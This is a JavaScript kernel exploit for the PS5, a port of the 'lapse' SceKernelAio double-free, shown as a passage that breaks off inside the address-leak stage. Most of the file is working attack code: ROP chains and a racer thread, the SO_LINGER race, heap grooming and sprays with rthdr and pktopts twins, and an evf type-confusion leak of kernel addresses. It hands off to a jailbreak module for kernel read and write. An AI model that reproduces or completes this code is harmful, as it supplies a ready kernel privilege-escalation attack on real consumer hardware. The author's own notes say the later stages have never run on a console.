/* lapse-ps5.js — SceKernelAio double-free ("lapse"), ported from
 * ufm42/cobolt's public/lapse.js onto this kit's ROP syscall path.
 *
 * WHAT THIS IS
 * ------------
 * A THIRD kernel bug. The three partition the firmware range exactly — every
 * supported console belongs to one and only one of them:
 *
 *   lapse    aio double free    09.00 - 10.01   seconds   <- this file
 *   netctrl  netcontrol UAF     10.20 - 12.00   seconds
 *   p2jb     cr_refcnt overflow 12.02 - 12.70   ~50 minutes
 *
 * FIRMWARE RANGE — READ THIS BEFORE USING IT
 * ------------------------------------------
 * lapse is documented as working up to 10.01, and the kernels agree that
 * something changed after that. Diffing _aio_multi_delete between kernel_1000
 * and kernel_1200 (found via sysent[0x296], which is a CFI thunk to the real
 * worker at 0xFFFFFFFF805FF1E0 / 0xFFFFFFFF8066A850) the two functions share
 * only ~55% of their normalised instruction stream, and 12.00 specifically adds
 * paired guards where 10.00 branched directly:
 *     setne r8b ; setb cl ; test r8b, cl ; je ...
 * plus extra `cmp word [rax+4],0` / `cmp byte [rax+0x..],0` state checks and an
 * SCE_KERNEL_ERROR_ESRCH store on a path 10.00 does not have. That is the shape
 * of a hardened id/state validation.
 *
 * I did NOT prove the bug is dead on 12.x — only that the function was reworked
 * in exactly the area the race depends on. So this file is gated to 09.00-10.01
 * and will refuse anything above it rather than race a patched kernel.
 *
 * WHY IT IS WORTH HAVING ANYWAY
 * -----------------------------
 * On the firmwares it covers, lapse should be a far EASIER race for this kit
 * than netcontrol is. netcontrol needs a genuinely tight window, which is
 * brutal at ~0.4 ms per ROP syscall. lapse does not race the scheduler at all:
 * it puts SO_LINGER on the socket so that soclose() SLEEPS inside
 * _fdrop(), and then wins at leisure while the other thread is parked in the
 * kernel. A 0.4 ms syscall is irrelevant against a one-second sleep.
 *
 * SCOPE
 * -----
 * Complete: double_free_reqs2 (the SO_LINGER race), find_rthdr_twins,
 * leak_kaddrs (evf type-confusion leak + reqs2 + target_id), double_free_reqs1
 * (the 0x100-zone free), make_pktopts_twins, and make_karw — which ends by
 * forging a pipebuf through the pktopts primitive.
 *
 * From there it HANDS OFF to netctrl-ps5.js: the pipe pair it builds is the
 * same primitive that module's KRW already drives, and allproc / jailbreak /
 * elfldr above it are route-independent. Duplicating them would mean two copies
 * of the code that writes kernel memory, which is the last thing worth forking.
 *
 * NONE of the stages after the race has run on hardware. double_free_reqs2 has
 * three console runs behind it, all failures, each one a different bug:
 *   1. a fresh thr_new per attempt gave the racer a ~0.4 ms head start, so the
 *      delete always completed before the poll     -> parked racer + batched wake
 *   2. every request carried the socket fd, so it had three references and
 *      _fdrop() never fired (tcp_state stuck at 4) -> only reqs1[which] gets it
 *   3. setup() was missing entirely, so the AIO worker pool was live and
 *      completed the target request on its own     -> block + groom, see setup()
 * Expect more of the same rather than a clean win.
 */
"use strict";

(function () {

/* ------------------------------------------------------------ constants */

// Verified against syscallnames[] in kernel_900/1000/1001/1020/1060/1100/1200 —
// identical on every one, so the numbers are not firmware-dependent.
const SYS = {
    accept: 30, getsockname: 32, connect: 98, bind: 104, listen: 106,
    socket: 97, close: 6, setsockopt: 105, getsockopt: 118, thr_new: 455,
    thr_exit: 431, read: 3, write: 4, pipe2: 687, socketpair: 135,
    aio_multi_delete: 0x296, aio_multi_wait: 0x297, aio_multi_poll: 0x298,
    aio_multi_cancel: 0x29a, aio_submit_cmd: 0x29d,
};

const AF_INET = 2, SOCK_STREAM = 1, AF_UNIX = 1;
const SOL_SOCKET = 0xffff, SO_REUSEADDR = 4, SO_LINGER = 0x80;
const TCP_INFO = 0x20, IPPROTO_TCP = 6, TCP_INFO_SIZE = 0xec;
// struct tcp_info's first byte is tcpi_state. 4 = TCPS_ESTABLISHED, i.e. the
// connection has NOT started tearing down yet — which means soclose() has not
// reached sodisconnect and the racer is not parked where we need it.
const TCPS_ESTABLISHED = 4;

/* 3 requests * sizeof(SceKernelAioRWRequest) = 3 * 0x28 = 0x78, which lands in
 * the 0x80 malloc zone. That sizing is the whole point: the freed entry has to
 * share a zone with something we can spray. */
const SIZEOF_AIO_RW_REQUEST = 0x28;
const NUM_REQS = 3;
const AIO_MAX_NUM = 0x80;
const ATTEMPT_NUM = 0x80;
/* The AIO subsystem runs a small pool of worker threads. WORKER_NUM of them is
 * all it takes to stall the pool (see setup()), and SPRAY_NUM submissions is
 * the heap groom that goes on top. Both values are the same in the PS4 and PS5
 * references, so they are properties of the AIO implementation rather than of
 * either console. */
const WORKER_NUM = 2;
const SPRAY_NUM = 0x200;

const AIO_CMD_READ = 1, AIO_CMD_MULTI = 0x1000;
const AIO_PRIORITY_HIGH = 3;
const AIO_OP_CANCEL = 1, AIO_OP_WAIT = 2, AIO_OP_POLL = 4, AIO_OP_DELETE = 8;
const AIO_WAIT_AND = 1;
const AIO_STATE_COMPLETE = 3, AIO_STATE_ABORTED = 4;
const SCE_KERNEL_ERROR_ESRCH = 0x80020003;

const THR_PARAM_SIZE = 0x68;
const THR_STACK_SIZE = 0x8000;
const THR_CHAIN_SIZE = 0x200;

/* --------------------------------------------------------------- plumbing */

const S = (n) => BigInt(n);
const hex = (v) => "0x" + BigInt(v).toString(16);

function log(m) {
    const sk = window.slopkit;
    if (sk && sk.mark) sk.mark("LAPSE " + m);
    else console.log("[lapse] " + m);
}

function rw() {
    const r = window.rop_worker;
    if (!r || typeof r.syscallSync !== "function")
        throw new Error("lapse: rop_worker not loaded");
    return r;
}

function sc(name, ...args) {
    const num = SYS[name];
    if (num === undefined) throw new Error("lapse: no syscall number for " + name);
    const r = rw().syscallSync(num, ...args);
    return Number(BigInt.asIntN(64, r.retval));
}

const alloc = (n) => rw().alloc(n);
const wr64 = (a, o, v) => window.write64(BigInt(a) + BigInt(o), BigInt(v));
const rd64 = (a, o) => BigInt(window.read64(BigInt(a) + BigInt(o)));
const wr32 = (a, o, v) => window.write32(BigInt(a) + BigInt(o), Number(v) >>> 0);
const rd32 = (a, o) => Number(window.read32(BigInt(a) + BigInt(o))) >>> 0;
const wr8b = (a, o, v) => window.write8(BigInt(a) + BigInt(o), Number(v) & 0xff);
function bzero(a, n) { for (let i = 0; i < n; i += 8) wr64(a, i, 0n); }

let G = null;                       // absolute gadget addresses
function gadgets() {
    if (G) return G;
    const sk = window.slopkit || {};
    const fw = String(sk.FW_VERSION || "");
    G = window.netctrl_ps5 && window.netctrl_ps5.gadgetsFor
        ? window.netctrl_ps5.gadgetsFor(fw) : null;
    if (!G) throw new Error("lapse: no gadget table for fw " + fw);
    return G;
}

/* ------------------------------------------------------------- aio layer */

const ST = {
    reqs1: 0n, ids: 0n, outs: 0n, tmp: 0n,
    server_sock: -1, server_addr: 0n,
};

/* reqs1 is the array aio_submit_cmd copies in.
 *
 * The default fd is -1 and that matters: EXACTLY ONE request may reference the
 * client socket. Setting fd on all three (which the first version did) gives
 * the socket three references, so the racer's aio_multi_delete of a single
 * request drops one and leaves two — the file never reaches refcount 0,
 * soclose() is never called, and the connection stays ESTABLISHED. That is
 * precisely what 128/128 attempts reported: poll=0x10004 tcp_state=4, with no
 * variance at all, which is the signature of a structural bug rather than a
 * lost race. The caller sets reqs1[which].fd per attempt instead. */
function build_reqs1(count, fd) {
    if (fd === undefined) fd = -1;
    bzero(ST.reqs1, SIZEOF_AIO_RW_REQUEST * AIO_MAX_NUM);
    for (let i = 0; i < count; i++) {
        const o = i * SIZEOF_AIO_RW_REQUEST;
        wr64(ST.reqs1, o + 0x08, fd === -1 ? 0n : 1n);   // nbyte
        wr32(ST.reqs1, o + 0x20, fd >>> 0);              // fd
    }
}

// Point one request at a socket, leaving the others at fd -1.
function set_req_fd(idx, fd) {
    wr32(ST.reqs1, idx * SIZEOF_AIO_RW_REQUEST + 0x20, fd >>> 0);
}

function spray_aio(cmd, num_reqs, idsAddr, count) {
    const step = (cmd & AIO_CMD_MULTI) ? num_reqs : 1;
    const n = (cmd & AIO_CMD_MULTI) ? Math.floor(count / step) : count;
    for (let i = 0; i < n * step; i += step) {
        sc("aio_submit_cmd", S(cmd), ST.reqs1, S(num_reqs),
           S(AIO_PRIORITY_HIGH), BigInt(idsAddr) + BigInt(i * 4));
    }
}

function process_aio(op, idsAddr, offset, count) {
    let off = offset, left = count;
    while (left > 0) {
        const step = Math.min(left, AIO_MAX_NUM);
        const a = BigInt(idsAddr) + BigInt(off * 4);
        if (op & AIO_OP_CANCEL) sc("aio_multi_cancel", a, S(step), ST.outs);
        if (op & AIO_OP_WAIT)   sc("aio_multi_wait", a, S(step), ST.outs, S(AIO_WAIT_AND), 0n);
        if (op & AIO_OP_POLL)   sc("aio_multi_poll", a, S(step), ST.outs);
        if (op & AIO_OP_DELETE) sc("aio_multi_delete", a, S(step), ST.outs);
        left -= step; off += step;
    }
}

/* ---------------------------------------------------------- race thread */

/* A racer that is ALREADY PARKED IN THE KERNEL, woken per attempt.
 *
 * The first version spawned a fresh thread per attempt and lost every time:
 * "poll says ESRCH — entry already gone" on 6/6 attempts. thr_new costs a full
 * ROP round trip (~0.4 ms), and the new thread ran its one syscall to
 * completion inside that window, so by the time this side issued its poll the
 * entry was already deleted. cobolt never has that gap — its racer sits on a
 * condvar and signal_work() wakes it in microseconds.
 *
 * So mirror that: spawn ONE thread up front whose chain is
 *     loop: read(wake_r, 1)            <- blocks in the kernel, ready to go
 *           aio_multi_delete(...)
 *           write(done_w, 1)           <- "finished", the wait_for_finished()
 *           jump back to loop
 * The loop-back is the same `pop rdi, <addr>; mov rsp, rdi; ret` construct p2jb
 * uses, because there is still no branch gadget in either module.
 *
 * Waking it and polling then go out as ONE batched chain (see the attempt
 * loop), so they are microseconds apart on the same thread instead of two
 * round trips. */
const RACER = { tid: 0n, wake: [0, 0], done: [0, 0], buf: 0n, spawned: false };

function spawnDeleteRacer(idsAddr, outsAddr) {
    if (RACER.spawned) return RACER;
    const g = gadgets();

    const pb = alloc(8);
    if (sc("pipe2", BigInt(pb), 0n) !== 0) throw new Error("lapse: pipe2(wake)");
    RACER.wake = [rd32(pb, 0) | 0, rd32(pb, 4) | 0];
    if (sc("pipe2", BigInt(pb), 0n) !== 0) throw new Error("lapse: pipe2(done)");
    RACER.done = [rd32(pb, 0) | 0, rd32(pb, 4) | 0];
    RACER.buf = BigInt(alloc(8));
    wr64(RACER.buf, 0, 0n);

    const chain = alloc(THR_CHAIN_SIZE);
    const stack = alloc(THR_STACK_SIZE);
    const param = alloc(THR_PARAM_SIZE);
    const tid = alloc(0x18);
    bzero(tid, 0x18);

    let o = 0n;
    const put = (v) => { wr64(chain, o, v); o += 8n; };
    const call3 = (num, a1, a2, a3) => {
        put(g.pop_rdi); put(a1);
        put(g.pop_rsi); put(a2);
        put(g.pop_rdx); put(a3);
        put(g.pop_rax); put(BigInt(num));
        put(g.syscall_wrapper);
    };

    const loopHead = BigInt(chain) + o;
    call3(SYS.read, S(RACER.wake[0]), RACER.buf, 1n);          // park here
    call3(SYS.aio_multi_delete, BigInt(idsAddr), 1n, BigInt(outsAddr));
    call3(SYS.write, S(RACER.done[1]), RACER.buf, 1n);         // signal finished
    put(g.pop_rdi); put(loopHead);
    put(g.pivot_rdi_rsp);

    bzero(param, THR_PARAM_SIZE);
    wr64(param, 0x00, g.pivot_rdi_rsp);     // start_func: rsp := arg
    wr64(param, 0x08, BigInt(chain));       // arg -> rdi -> the chain
    wr64(param, 0x10, BigInt(stack));
    wr64(param, 0x18, BigInt(THR_STACK_SIZE));
    wr64(param, 0x30, BigInt(tid));
    wr64(param, 0x38, BigInt(tid));

    const rv = sc("thr_new", BigInt(param), S(THR_PARAM_SIZE));
    if (rv !== 0) throw new Error("lapse: thr_new(racer) -> " + rv);
    RACER.tid = BigInt(tid);
    RACER.spawned = true;
    log("racer parked: wake=" + RACER.wake.join("/")
        + " done=" + RACER.done.join("/"));
    return RACER;
}

/* Block until the racer says it finished its delete — cobolt's
 * race_worker.wait_for_finished(). */
function waitRacer() {
    sc("read", S(RACER.done[0]), RACER.buf, S(1));
}

/* --------------------------------------------------------------- checks */

/* A won race leaves the entry double-freed; cobolt recognises it by the entry
 * still carrying heap pointers where a clean free would have zeroed them.
 * Kernel heap addresses on PS5 are 0xffff_xxxx_xxxx_xxxx. */
function verify_reqs2(buf) {
    const looksHeap = (v) => (v >> 48n) === 0xffffn;
    const cmd = rd32(buf, 0x00);
    if ((cmd & 0xffff) !== (AIO_CMD_READ | AIO_CMD_MULTI) &&
        (cmd & 0xffff) !== AIO_CMD_READ) return false;
    for (const off of [0x10, 0x18, 0x20, 0x28]) {
        const v = rd64(buf, off);
        if (v !== 0n && !looksHeap(v)) return false;
    }
    return true;
}

/* --------------------------------------------------------------- setup */

/* Stall the AIO worker pool, then groom the heap. Both references do this and
 * I had omitted it entirely — which is why the race could never be won.
 *
 * WHY IT MATTERS. aio_submit_cmd queues work to a pool of kernel worker
 * threads that complete requests in the background. Left running, they process
 * the target request on their own schedule: by the time the racer's delete and
 * our confirming delete arrive, the entry has already been completed and torn
 * down by a worker, so one of the two deletes always finds nothing. That is
 * exactly the shape of the last failure — every attempt reported
 * errs=0x80020003/0x0, i.e. the racer's delete returned 0 and ours got ESRCH,
 * with no variance across 128 attempts.
 *
 * The block is WORKER_NUM read requests aimed at the read end of a socketpair
 * that nothing ever writes to. Each one parks a worker thread forever, so no
 * request we submit afterwards is ever processed in the background and both
 * deletes reach the entry in the state we left it.
 *
 * The spray afterwards is a heap groom: SPRAY_NUM submissions of NUM_REQS
 * requests each, then cancel, so the 0x80 zone is already warm and the freed
 * aio_entry is likely to be reclaimed by something we control. */
function setup() {
    const pair = alloc(8);
    if (sc("socketpair", S(AF_UNIX), S(SOCK_STREAM), 0n, BigInt(pair)) !== 0)
        throw new Error("lapse: socketpair(block) failed");
    ST.block_ss = [rd32(pair, 0) | 0, rd32(pair, 4) | 0];

    ST.spray_ids = BigInt(alloc(4 * SPRAY_NUM));
    bzero(ST.spray_ids, 4 * SPRAY_NUM);

    // block: WORKER_NUM reads on a socketpair that never receives anything
    build_reqs1(WORKER_NUM, ST.block_ss[0]);
    spray_aio(AIO_CMD_READ, WORKER_NUM, ST.spray_ids, 1);
    ST.block_id = rd32(ST.spray_ids, 0);
    if (ST.block_id === 0)
        throw new Error("lapse: block submit produced no id — the AIO pool is "
                        + "not stalled and the race cannot be won");
    log("AIO blocked: block_ss=" + ST.block_ss.join("/")
        + " block_id=" + hex(ST.block_id));

    // groom
    build_reqs1(NUM_REQS, -1);
    spray_aio(AIO_CMD_READ, NUM_REQS, ST.spray_ids, SPRAY_NUM);
    process_aio(AIO_OP_CANCEL, ST.spray_ids, 0, SPRAY_NUM);
    log("AIO groom done (" + SPRAY_NUM + " submits)");
}

/* ------------------------------------------------------------- the race */

function setupServer() {
    const sa = alloc(0x10);
    bzero(sa, 0x10);
    // struct sockaddr_in: len(1) family(1) port(2,BE) addr(4,BE) zero(8)
    wr32(sa, 0x00, (AF_INET << 8) | 0x10);
    wr32(sa, 0x04, 0x0100007f);                 // 127.0.0.1
    ST.server_addr = BigInt(sa);

    const s = sc("socket", S(AF_INET), S(SOCK_STREAM), 0n);
    if (s < 0) throw new Error("lapse: server socket -> " + s);

    const one = alloc(4); wr32(one, 0, 1);
    sc("setsockopt", S(s), S(SOL_SOCKET), S(SO_REUSEADDR), BigInt(one), S(4));

    if (sc("bind", S(s), ST.server_addr, S(0x10)) !== 0)
        throw new Error("lapse: bind failed");

    const alen = alloc(4); wr32(alen, 0, 0x10);
    if (sc("getsockname", S(s), ST.server_addr, BigInt(alen)) !== 0)
        throw new Error("lapse: getsockname failed");

    if (sc("listen", S(s), S(1)) !== 0)
        throw new Error("lapse: listen failed");

    ST.server_sock = s;
    const port = ((rd32(ST.server_addr, 0) >>> 16) & 0xffff);
    log("server fd=" + s + " port=" + ((port >> 8) | ((port & 0xff) << 8)));
}

function double_free_reqs2() {
    setupServer();

    const linger = alloc(8);
    wr32(linger, 0x00, 1);          // l_onoff
    wr32(linger, 0x04, 1);          // l_linger = 1s: soclose() will SLEEP

    const which = NUM_REQS - 1;
    const idsAddr = ST.ids;
    const idsWhich = BigInt(idsAddr) + BigInt(which * 4);
    const outs1 = BigInt(ST.outs) + 4n;    // racer writes its error here

    // TCP_INFO scratch, allocated once: the state byte is read every attempt.
    const info = alloc(TCP_INFO_SIZE);
    const infoLen = alloc(4);

    /* Build the request template ONCE, with every fd at -1. Only reqs1[which]
     * is re-pointed at each attempt's socket; the other two must stay at -1 so
     * the socket has exactly one reference for the racer's delete to drop. */
    build_reqs1(NUM_REQS, -1);

    // Park the racer ONCE, before the loop — see spawnDeleteRacer.
    spawnDeleteRacer(idsWhich, outs1);

    for (let attempt = 0; attempt < ATTEMPT_NUM; attempt++) {
        const client = sc("socket", S(AF_INET), S(SOCK_STREAM), 0n);
        if (client < 0) throw new Error("lapse: client socket -> " + client);
        if (sc("connect", S(client), ST.server_addr, S(0x10)) !== 0)
            throw new Error("lapse: connect failed");
        const conn = sc("accept", S(ST.server_sock), 0n, 0n);
        if (conn < 0) throw new Error("lapse: accept -> " + conn);

        // make soclose() sleep — this is what turns a tight race into a wide one
        sc("setsockopt", S(client), S(SOL_SOCKET), S(SO_LINGER), BigInt(linger), S(8));

        // ONE request references the socket — see build_reqs1.
        set_req_fd(which, client);
        bzero(idsAddr, NUM_REQS * 4);
        spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, NUM_REQS, idsAddr, NUM_REQS);

        /* Check the submit actually produced ids. aio_submit_cmd's return was
         * being discarded, and a failed submit is indistinguishable downstream
         * from a lost race: no request would hold the socket, close() would
         * drop it immediately, and every attempt would look wrong for a reason
         * nothing in the log names. */
        const id0 = rd32(idsAddr, which * 4);
        if (id0 === 0) {
            sc("close", S(client)); sc("close", S(conn));
            throw new Error("lapse: aio_submit_cmd produced no id for req "
                            + which + " — nothing holds the socket");
        }

        process_aio(AIO_OP_CANCEL | AIO_OP_POLL, idsAddr, 0, NUM_REQS);

        // drop our reference so the racer's delete is the one that _fdrop()s
        sc("close", S(client));

        /* Wake the racer and poll in ONE chain. Two separate syscalls here is
         * what lost the race every time: each is a ~0.4 ms round trip, and the
         * delete finished inside the gap. Batched, the poll is issued
         * microseconds after the wake byte lands, while the racer is still
         * being scheduled into aio_multi_delete. */
        wr32(ST.outs, 0x00, 0);
        wr32(ST.outs, 0x04, 0);
        rw().syscallBatch([
            [SYS.write, S(RACER.wake[1]), RACER.buf, 1n],
            [SYS.aio_multi_poll, idsWhich, 1n, ST.outs],
        ]);
        const pollErr = rd32(ST.outs, 0);

        /* The REAL proof, and what the first version was missing.
         *
         * A non-ESRCH poll alone means nothing — it only says the entry still
         * existed. What shows the racer is parked INSIDE soclose() (and so that
         * two frees are in flight on one entry) is the connection having
         * already left ESTABLISHED: soclose's SO_LINGER path calls sodisconnect
         * before it sleeps. cobolt requires both, and without the tcp_state
         * half every "win" would be a false positive. */
        wr32(infoLen, 0x00, TCP_INFO_SIZE);
        const gso = sc("getsockopt", S(conn), S(IPPROTO_TCP), S(TCP_INFO),
                       BigInt(info), BigInt(infoLen));
        const tcpState = gso === 0 ? (rd32(info, 0x00) & 0xff) : -1;

        let won = false;
        if (pollErr !== SCE_KERNEL_ERROR_ESRCH && tcpState !== TCPS_ESTABLISHED) {
            // Confirming delete on the same entry — this is the second free.
            process_aio(AIO_OP_DELETE, idsAddr, which, 1);
            won = true;
        }

        waitRacer();

        if (won) {
            /* Both the racer's delete and ours must have returned 0. If either
             * errored the entry was not freed twice and continuing would spray
             * against a chunk that is still live. */
            const e0 = rd32(ST.outs, 0x00), e1 = rd32(ST.outs, 0x04);
            if (e0 === 0 && e1 === 0) {
                log("attempt " + attempt + ": WON — poll=" + hex(pollErr)
                    + " tcp_state=" + tcpState + " errs=0/0 (double free)");
                /* RECLAIM IMMEDIATELY, before the cleanup delete and before
                 * closing the connection.
                 *
                 * From here until an rthdr lands in it, one chunk of the 0x80
                 * zone is on the free list twice and ANY allocation in the
                 * system can take it — at which point the next free corrupts
                 * live kernel data. The reference calls find_rthdr_twins here
                 * for exactly that reason; doing it from the caller (which is
                 * what this did) leaves a delete and a close sitting inside the
                 * window. */
                find_rthdr_twins();
                process_aio(AIO_OP_DELETE, idsAddr, 0, NUM_REQS);
                sc("close", S(conn));
                return { ids: idsAddr, which: which, attempt: attempt };
            }
            log("attempt " + attempt + ": race looked won but errs=" + hex(e0)
                + "/" + hex(e1) + " — not a clean double free");
        } else {
            log("attempt " + attempt + ": lost (poll=" + hex(pollErr)
                + " tcp_state=" + tcpState + ")");
        }

        /* MEMLEAK, as cobolt notes: a won race decrements ao_num_reqs twice and
         * leaves one request undeleted. Clean up what we can either way. */
        process_aio(AIO_OP_DELETE, idsAddr, 0, NUM_REQS);
        sc("close", S(conn));
    }
    throw new Error("lapse: lost the aio double-free race in " + ATTEMPT_NUM
                    + " attempts");
}

/* ---------------------------------------------------------- rthdr layer */

const AF_INET6 = 28, SOCK_DGRAM = 2;
const IPPROTO_IPV6 = 41;
const IPV6_2292PKTOPTIONS = 25, IPV6_PKTINFO = 46, IPV6_NEXTHOP = 48;
const IPV6_RTHDR = 51, IPV6_TCLASS = 61;
const IPV6_SOCK_NUM = 0x80, HANDLES_NUM = 0x100;
const FILEDESCENT_SIZE = 0x30n, PAGE_SIZE = 0x4000;
const AIO_CMD_WRITE = 2;

/* ip6_rthdr0: nxt(1) len(1) type(1) segleft(1) reserved(4). The kernel
 * allocates (len+1)*8 bytes for it and len must be even — that is the whole
 * mechanism for choosing which malloc zone a spray lands in. */
function build_rthdr(addr, size) {
    const len = ((size >> 3) - 1) & ~1;
    wr32(addr, 0x00, ((len << 8) | ((len >> 1) << 24)) >>> 0);
    return (len + 1) << 3;
}
function set_rthdr(sock) {
    return sc("setsockopt", S(sock), S(IPPROTO_IPV6), S(IPV6_RTHDR),
              ST.spray, S(ST.sprayLen));
}
function free_rthdr(sock) {
    return sc("setsockopt", S(sock), S(IPPROTO_IPV6), S(IPV6_RTHDR), 0n, 0n);
}
function get_rthdr(sock, size) {
    wr32(ST.lenp, 0x00, size);
    sc("getsockopt", S(sock), S(IPPROTO_IPV6), S(IPV6_RTHDR),
       ST.leak, ST.lenp);
    return rd32(ST.lenp, 0x00);
}
function make_socket(af, type) {
    const s = sc("socket", S(af), S(type), 0n);
    if (s < 0) throw new Error("lapse: socket(" + af + "," + type + ") -> " + s);
    return s;
}

/* --------------------------------------------------------- reqs2 verify */

/* Kernel heap pointers are 0xffff_XXXX_..., where XXXX is randomised per boot.
 * A genuine aio_entry's pointers must therefore SHARE that prefix, which is a
 * much stronger test than "looks canonical" and is what stops a half-reclaimed
 * chunk being mistaken for the real thing. */
function verify_reqs2(a) {
    const pref = [];
    const want = (v) => {
        if ((v >> 0x30n) !== 0xffffn) return false;
        pref.push((v >> 0x20n) & 0xffffn);
        return true;
    };
    if (rd32(a, 0x00) !== AIO_CMD_WRITE) return false;
    if (!want(rd64(a, 0x10))) return false;          // ar2_reqs1
    if (!want(rd64(a, 0x18))) return false;          // ar2_info
    if (!want(rd64(a, 0x20))) return false;          // ar2_batch
    const state = rd32(a, 0x38);
    if (state <= 0 || state > AIO_STATE_ABORTED) return false;
    if (rd32(a, 0x3c) !== 0) return false;           // ar2_result._pad
    if (rd64(a, 0x40) !== 0n) return false;          // ar2_file: the fd was -1
    const unk2 = rd64(a, 0x48);
    if (unk2 !== 0n && !want(unk2)) return false;
    if (!want(rd64(a, 0x50))) return false;          // ar2_qentry
    return pref.every((v) => v === pref[0]);
}

/* ----------------------------------------------------------- twin hunts */

function find_rthdr_twins() {
    for (let i = 0; i < ATTEMPT_NUM; i++) {
        for (let j = 0; j < ST.socks.length; j++) {
            wr32(ST.spray, 0x04, j);                 // ip6r0_reserved = index
            set_rthdr(ST.socks[j]);
        }
        for (let j = 0; j < ST.socks.length; j++) {
            get_rthdr(ST.socks[j], 8);
            const idx = rd32(ST.leak, 0x04);
            if (idx !== j && idx < ST.socks.length) {
                ST.rthdr_twins = [ST.socks[j], ST.socks[idx]];
                const hi = Math.max(j, idx), lo = Math.min(j, idx);
                ST.socks.splice(hi, 1); ST.socks.splice(lo, 1);
                for (const s of ST.socks) free_rthdr(s);
                ST.socks.push(make_socket(AF_INET6, SOCK_DGRAM),
                              make_socket(AF_INET6, SOCK_DGRAM));
                log("rthdr twins " + ST.rthdr_twins.join("/")
                    + " after " + i + " rounds");
                return true;
            }
        }
    }
    throw new Error("lapse: no rthdr twins in " + ATTEMPT_NUM + " rounds");
}

function make_pktopts_twins() {
    const tc = alloc(4), tcl = alloc(4);
    for (let i = 0; i < ATTEMPT_NUM; i++) {
        // drop every pktopts, then rebuild them tagged with their index
        for (const s of ST.socks)
            sc("setsockopt", S(s), S(IPPROTO_IPV6), S(IPV6_2292PKTOPTIONS), 0n, 0n);
        for (let j = 0; j < ST.socks.length; j++) {
            wr32(tc, 0x00, j);
            sc("setsockopt", S(ST.socks[j]), S(IPPROTO_IPV6), S(IPV6_TCLASS),
               BigInt(tc), S(4));
        }
        for (let j = 0; j < ST.socks.length; j++) {
            wr32(tcl, 0x00, 4);
            sc("getsockopt", S(ST.socks[j]), S(IPPROTO_IPV6), S(IPV6_TCLASS),
               BigInt(tc), BigInt(tcl));
            const idx = rd32(tc, 0x00);
            if (idx !== j && idx < ST.socks.length) {
                ST.pktopts_twins = [ST.socks[j], ST.socks[idx]];
                const hi = Math.max(j, idx), lo = Math.min(j, idx);
                ST.socks.splice(hi, 1); ST.socks.splice(lo, 1);
                /* Replace them AND give the replacements a pktopts right away,
                 * while the double-freed chunk is still claimed. Leaving that
                 * gap open is how an unrelated allocation steals it. */
                for (let k = 0; k < 2; k++) {
                    const s = make_socket(AF_INET6, SOCK_DGRAM);
                    sc("setsockopt", S(s), S(IPPROTO_IPV6), S(IPV6_TCLASS),
                       BigInt(tc), S(4));
                    ST.socks.push(s);
                }
                log("pktopts twins " + ST.pktopts_twins.join("/")
                    + " after " + i + " rounds");
                return true;
            }
        }
    }
    throw new Error("lapse: could not make pktopts twins");
}

/* --------------------------------------------------------- leak_kaddrs */

function leak_kaddrs() {
    sc("close", S(ST.rthdr_twins[1]));

    /* Type-confuse a struct evf with the ip6_rthdr. The evf's flags field
     * overlaps ip6r0_len, so a flags value >= 0xf00 makes getsockopt hand back
     * the whole 0x80 chunk. That is the leak primitive. */
    const name = alloc(8); wr64(name, 0, 0n);
    let evf = 0, leaked = false;
    for (let i = 0; i < ATTEMPT_NUM && !leaked; i++) {
        const evfs = [];
        for (let j = 0; j < HANDLES_NUM; j++)
            evfs.push(sc("evf_create", BigInt(name), 0n,
                         S(((j << 0x10) | 0xf00) >>> 0)));
        get_rthdr(ST.rthdr_twins[0], 0x80);
        const marker = rd32(ST.leak, 0x00);
        if ((marker & 0xffff) === 0xf00) {
            const idx = marker >>> 0x10;
            evf = evfs[idx];
            sc("evf_clear", S(evf), 0n);
            sc("evf_set", S(evf), S((marker | 1) >>> 0));
            get_rthdr(ST.rthdr_twins[0], 0x80);
            const m2 = rd32(ST.leak, 0x00);
            if ((m2 & 0xffff) === ((marker & 0xffff) | 1) && (m2 >>> 0x10) === idx) {
                leaked = true;
                evfs.splice(idx, 1);
                log("leaked evf handle " + hex(evf) + " after " + i + " rounds");
            }
        }
        for (const e of evfs) sc("evf_delete", S(e));
    }
    if (!leaked) throw new Error("lapse: could not leak an evf");

    ST.evf = evf;
    // evf.cv.cv_description points at the string "evf cv" in the kernel image
    ST.evf_cv = rd64(ST.leak, 0x28);
    /* TAILQ_INIT leaves evf.waiters.tqh_last == &evf.waiters.tqh_first, so the
     * chunk's own address falls straight out of the leak. */
    ST.reqs2_addr = rd64(ST.leak, 0x40) - 0x38n;
    log("evf_cv=" + hex(ST.evf_cv) + " reqs2=" + hex(ST.reqs2_addr));

    // widen the OOB read to 0x800 by driving ip6r0_len through the evf flags
    sc("evf_clear", S(ST.evf), 0n);
    sc("evf_set", S(ST.evf), S(0xff << 8));

    /* reqs1 doubles as two forged structures:
     *   .buf  -> reqs2+4, so a later crfree(ai_cred) harmlessly decrements
     *            ar2_ticket instead of touching a real credential
     *   +0x28 -> a fake aio_batch that already looks complete and unlocked */
    const NUM6 = 6;                       // 6 * 0x28 = 0xF0 -> the 0x100 zone
    build_reqs1(NUM6, -1);
    wr64(ST.reqs1, 0x10, ST.reqs2_addr + 4n);
    const b = ST.reqs1 + 0x28n;
    wr32(b, 0x00, 1);                     // ar3_num_reqs
    wr32(b, 0x04, 0);                     // ar3_reqs_left
    wr32(b, 0x08, AIO_STATE_COMPLETE);
    wr32(b, 0x0c, 0);                     // ar3_done
    wr32(b, 0x28, 0x67b0000);             // ar3_lock.lock_object.lo_flags
    wr64(b, 0x38, 1n);                    // ar3_lock.lk_lock = LK_UNLOCKED

    const N6 = HANDLES_NUM * NUM6;
    const leakIds = alloc(4 * N6);
    bzero(leakIds, 4 * N6);

    let idx2 = -1;
    leaked = false;
    for (let i = 0; i < ATTEMPT_NUM && !leaked; i++) {
        spray_aio(AIO_CMD_WRITE | AIO_CMD_MULTI, NUM6, leakIds, N6);
        get_rthdr(ST.rthdr_twins[0], 0x800);
        for (let j = 1; j < 0x10; j++) {
            if (verify_reqs2(ST.leak + BigInt(j * 0x80))) {
                idx2 = j; leaked = true;
                log("reqs2 at leak index " + j + " after " + i + " rounds");
                break;
            }
        }
        if (!leaked)
            process_aio(AIO_OP_CANCEL | AIO_OP_POLL | AIO_OP_DELETE, leakIds, 0, N6);
    }
    if (!leaked) throw new Error("lapse: could not leak reqs2");

    const r2 = ST.leak + BigInt(idx2 * 0x80);
    ST.reqs2_leak_off = idx2 * 0x80;
    // reqs1 came from the 0x100 zone, so it is 0x100-aligned
    ST.reqs1_addr = rd64(r2, 0x10) & ~0xffn;
